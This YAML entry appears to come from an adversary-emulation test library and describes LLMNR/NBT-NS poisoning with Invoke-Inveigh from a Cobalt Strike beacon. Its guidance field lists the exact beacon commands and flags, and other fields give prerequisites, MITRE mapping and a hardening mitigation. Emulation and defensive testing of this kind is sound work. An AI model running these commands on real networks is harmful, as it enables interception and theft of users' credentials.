block:
- Disable LLMNR/NTB-NS via registry/GPO configurations
controls:
- Hardening
description: Poison LLMNR/NBT-NS traffic using the PowerShell script Invoke-Inveigh
  in a beacon
detect:
- null
guidance:
- beacon> powershell-import {{ inveigh_script_path }}
- beacon> powershell Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput Y -RunTime
  10 -StartupChecks N
- (or) beacon> powerpick Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput Y
  -RunTime 10 -StartupChecks N
logs:
- network
metadata:
  groups:
  - Wizard Spider
  isv: 1
  tactic: TA0006
  tid: T1557.001
  x_tool_links:
  - https://github.com/Kevin-Robertson/Inveigh
  x_tools:
  - Cobalt Strike
name: LLMNR/NBT-NS Poisoning via Invoke-Inveigh in Beacon
platforms:
- windows
prerequisites:
- local_admin
